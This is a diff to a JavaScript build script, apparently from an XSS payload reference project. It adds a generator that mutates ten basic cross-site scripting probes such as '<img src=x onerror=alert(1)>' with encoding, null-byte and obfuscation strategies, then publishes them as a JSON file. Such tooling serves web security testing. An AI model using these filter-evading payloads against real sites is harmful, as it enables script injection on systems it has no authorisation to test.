@@ -11,6 +11,7 @@ import { fileURLToPath } from 'url';
 
 // Import payload data
 import { payloads } from '../data/payloads.mjs';
+import { generateMutations } from '../utils/payload-fuzzer.js';
 
 // Get __dirname equivalent in ES modules
 const __filename = fileURLToPath(import.meta.url);
@@ -239,6 +240,65 @@ function generateSchemaJSON() {
 }
 
 /**
+ * Generate fuzzer-mutations.json - Pre-generated payload mutations
+ */
+function generateFuzzerMutationsJSON() {
+  // Base payloads to fuzz
+  const basePayloads = [
+    { base: '<script>alert(1)</script>', category: 'basic' },
+    { base: '<img src=x onerror=alert(1)>', category: 'event-handler' },
+    { base: '<svg/onload=alert(1)>', category: 'svg' },
+    { base: 'javascript:alert(1)', category: 'protocol-handler' },
+    { base: '<iframe src="javascript:alert(1)">', category: 'iframe' },
+    { base: '<input onfocus=alert(1) autofocus>', category: 'input-event' },
+    { base: '<body onload=alert(1)>', category: 'body-event' },
+    { base: '<details open ontoggle=alert(1)>', category: 'html5' },
+    { base: "'-alert(1)-'", category: 'javascript-context' },
+    { base: '"onload=alert(1)//', category: 'attribute-context' }
+  ];
+
+  // Apply all mutation strategies
+  const allStrategies = {
+    htmlEntities: true,
+    urlEncoding: true,
+    unicodeEscapes: true,
+    base64: true,
+    caseVariations: true,
+    quoteSubstitution: true,
+    whitespaceVariation: true,
+    nullBytes: true,
+    comments: true,
+    protocolVariation: true,
+    obfuscation: true
+  };
+
+  const mutatedPayloads = basePayloads.map(item => {
+    const result = generateMutations(item.base, allStrategies);
+    return {
+      base: item.base,
+      category: item.category,
+      mutations: result.mutations,
+      mutationCount: result.total
+    };
+  });
+
+  const totalMutations = mutatedPayloads.reduce((sum, item) => sum + item.mutationCount, 0);
+
+  const data = {
+    version: API_VERSION,
+    generated: new Date().toISOString(),
+    basePayloads: mutatedPayloads,
+    totalBasePayloads: basePayloads.length,
+    totalMutations: totalMutations,
+    strategies: Object.keys(allStrategies)
+  };
+
+  const filePath = path.join(API_DIR, 'fuzzer-mutations.json');
+  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
+  console.log(`✓ Generated fuzzer-mutations.json (${totalMutations} mutations from ${basePayloads.length} base payloads)`);
+}
+
+/**
  * Main execution
  */
 function main() {
@@ -250,13 +310,15 @@ function main() {
     generatePayloadsByCategoryJSON();
     generateCategoriesJSON();
     generateSchemaJSON();
+    generateFuzzerMutationsJSON();
 
     console.log('\n✅ API generation complete!\n');
     console.log('Generated files:');
     console.log('  - /public/api/payloads.json');
     console.log('  - /public/api/payloads-by-category.json');
     console.log('  - /public/api/categories.json');
-    console.log('  - /public/api/schema.json\n');
+    console.log('  - /public/api/schema.json');
+    console.log('  - /public/api/fuzzer-mutations.json\n');
   } catch (error) {
     console.error('\n❌ Error generating API files:', error.message);
     process.exit(1);
